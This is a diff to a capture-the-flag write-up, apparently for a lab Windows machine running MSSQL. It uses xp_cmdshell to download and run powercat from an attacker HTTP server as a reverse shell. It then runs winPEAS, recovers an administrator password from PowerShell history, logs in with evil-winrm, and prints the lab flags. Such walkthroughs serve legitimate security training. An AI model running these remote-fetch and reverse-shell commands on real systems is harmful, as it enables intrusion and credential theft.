@@ -258,7 +258,7 @@ SQL> help
      ! {cmd}                    - executes a local shell cmd
 ```
 
-We can enable xp\_cmdshell even though it is disabled by default.
+We can enable xp\_cmdshell using `enable_xp_cmdshell`, even though it is disabled by default.
 
 After enabling it we can find the username that has access to the service:
 
@@ -283,11 +283,170 @@ Now that we have&#x20;
 
 ### Using metasploit
 
-### Using netcat reverse shell
+### Using net/powercat reverse shell and python HTTP server
+
+We can download [`powercat.ps1`](https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1) file on the victim machine by hosting it in a python HTTP server.
+
+Start python HTTP server using:
+
+```
+python3 -m http.server 8000
+```
+
+Now setup a netcat listener
+
+```awk
+nc -vnlp 4444
+```
+
+Now on our mssqlclient we use:
+
+```sql
+xp_cmdshell "powershell -c cd C:\Users\Public; IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.28:8000/powercat.ps1\"); powercat -c 10.10.14.28 -p 4444 -e cmd;"
+```
+
+The client freezes but we get a shell on our netcat listener terminal:
+
+```
+listening on [any] 4444 ...
+connect to [10.10.14.28] from (UNKNOWN) [10.129.228.29] 49680
+Microsoft Windows [Version 10.0.17763.2061]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+```
+
+If we try to enter the Administrator user's directory we can't from here:
+
+```
+C:\Users>cd Administrator
+cd Administrator
+Access is denied.
+```
+
+So we need to perform privilege escalation. We use `winpeas` for this. After changing to `powershell`, we can use:
+
+```powershell
+wget http://10.10.14.28:8000/winPEASx64.exe -o winPEASx64.exe; .\winPEASx64.exe
+```
+
+Winpeas gives us some critical vulnetrabilities:
+
+```
+[!] CVE-2019-0836 : VULNERABLE
+  [>] https://exploit-db.com/exploits/46718
+  [>] https://decoder.cloud/2019/04/29/combinig-luafv-postluafvpostreadwrite-race-condition-pe-with-diaghub-collector-exploit-from-standard-user-to-system/
+
+ [!] CVE-2019-0841 : VULNERABLE
+  [>] https://github.com/rogue-kdc/CVE-2019-0841
+  [>] https://rastamouse.me/tags/cve-2019-0841/
+
+ [!] CVE-2019-1064 : VULNERABLE
+  [>] https://www.rythmstick.net/posts/cve-2019-1064/
+
+ [!] CVE-2019-1130 : VULNERABLE
+  [>] https://github.com/S3cur3Th1sSh1t/SharpByeBear
+
+ [!] CVE-2019-1253 : VULNERABLE
+  [>] https://github.com/padovah4ck/CVE-2019-1253
+  [>] https://github.com/sgabe/CVE-2019-1253
+
+ [!] CVE-2019-1315 : VULNERABLE
+  [>] https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html
+
+ [!] CVE-2019-1385 : VULNERABLE
+  [>] https://www.youtube.com/watch?v=K6gHnr-VkAg
+
+ [!] CVE-2019-1388 : VULNERABLE
+  [>] https://github.com/jas502n/CVE-2019-1388
+
+ [!] CVE-2019-1405 : VULNERABLE
+  [>] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/                                                                                                                                                                            
+  [>] https://github.com/apt69/COMahawk
+
+ [!] CVE-2020-0668 : VULNERABLE
+  [>] https://github.com/itm4n/SysTracingPoc
+
+ [!] CVE-2020-0683 : VULNERABLE
+  [>] https://github.com/padovah4ck/CVE-2020-0683
+  [>] https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/cve-2020-0683.ps1
+
+ [!] CVE-2020-1013 : VULNERABLE
+  [>] https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/
+
+ [*] Finished. Found 12 potential vulnerabilities.
+```
+
+And the powershell console history.
+
+```
+ PS history file: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+ PS history size: 79
+```
+
+Which gives us the Administrator password:
+
+```
+cat C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
+exit
+```
+
+### Gain administrator access
 
 ### Using impacket-psexec
 
 ### Using evil-winrm
+
+```awk
+evil-winrm -i 10.129.228.29 -u administrator -p 'MEGACORP_4dm1n!!'
+```
+
+```
+*Evil-WinRM* PS C:\Users\Administrator> dir
+
+
+    Directory: C:\Users\Administrator
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---        7/27/2021   2:30 AM                3D Objects
+d-r---        7/27/2021   2:30 AM                Contacts
+d-r---        7/27/2021   2:30 AM                Desktop
+d-r---        7/27/2021   2:30 AM                Documents
+d-r---        7/27/2021   2:30 AM                Downloads
+d-r---        7/27/2021   2:30 AM                Favorites
+d-r---        7/27/2021   2:30 AM                Links
+d-r---        7/27/2021   2:30 AM                Music
+d-r---        7/27/2021   2:30 AM                Pictures
+d-r---        7/27/2021   2:30 AM                Saved Games
+d-r---        7/27/2021   2:30 AM                Searches
+d-r---        7/27/2021   2:30 AM                Videos
+
+
+*Evil-WinRM* PS C:\Users\Administrator>
+```
+
+## FLAGS
+
+### Root Flag
+
+```
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
+b91ccec3305e98240082d4474b848528
+*Evil-WinRM* PS C:\Users\Administrator\Desktop>
+```
+
+### User Flag
+
+```
+*Evil-WinRM* PS C:\Users\sql_svc\Desktop> cat user.txt
+3e7b102e78218e935bf3f4951fec21a3
+*Evil-WinRM* PS C:\Users\sql_svc\Desktop> 
+```
+
+
 
 
 
